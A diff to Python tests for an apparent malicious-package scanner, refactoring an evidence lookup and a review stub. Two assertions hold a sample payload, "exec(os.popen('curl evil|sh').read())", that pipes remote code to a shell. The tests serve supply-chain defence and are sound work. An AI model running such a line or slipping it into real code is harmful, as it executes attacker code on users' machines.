@@ -19,7 +19,7 @@ def _queue_suspicious(cfg, tmp_path):
     tr = TriageResult(50.0, [FiredRule("autoexec", 50.0, "setup.py", (1, 2))], True)
     v = Verdict("p", "1.0", "suspicious", 50.0, tr.fired_rules, False, confidence=0.6,
                 attack_type="install-hook-rce", reasoning="model says...", model="qwen-singleshot")
-    orchestrator._review_escalated(cfg, conn, type("R", (), {"prepare": lambda s, d, tr: "", "review_text": lambda s, *a, **kw: v})(), d, tr, rid)
+    orchestrator._review_escalated(cfg, conn, type("R", (), {"prepare": lambda s, d, tr, cap=None: "", "review_text": lambda s, *a, **kw: v})(), d, tr, rid)
     return conn, rid
 
 
@@ -75,7 +75,7 @@ def test_backfill_captures_evidence_for_existing_flagged_row(tmp_path, monkeypat
     res = orchestrator.backfill_evidence(cfg)
     assert len(res) == 1 and res[0]["captured"] is True
     conn = store.connect(cfg)
-    ev = conn.execute("SELECT evidence FROM releases WHERE id=?", (rid,)).fetchone()[0]
+    ev = store.get_evidence(conn, rid)
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
 
@@ -116,7 +116,7 @@ def test_backfill_reconstructs_first_release_scan(tmp_path, monkeypatch):
     res = orchestrator.backfill_evidence(cfg)
     assert len(res) == 1 and res[0]["captured"] is True
     conn = store.connect(cfg)
-    ev = conn.execute("SELECT evidence FROM releases WHERE id=?", (rid,)).fetchone()[0]
+    ev = store.get_evidence(conn, rid)
     assert ev is not None and "exec(os.popen('curl evil|sh').read())" in ev
 
 
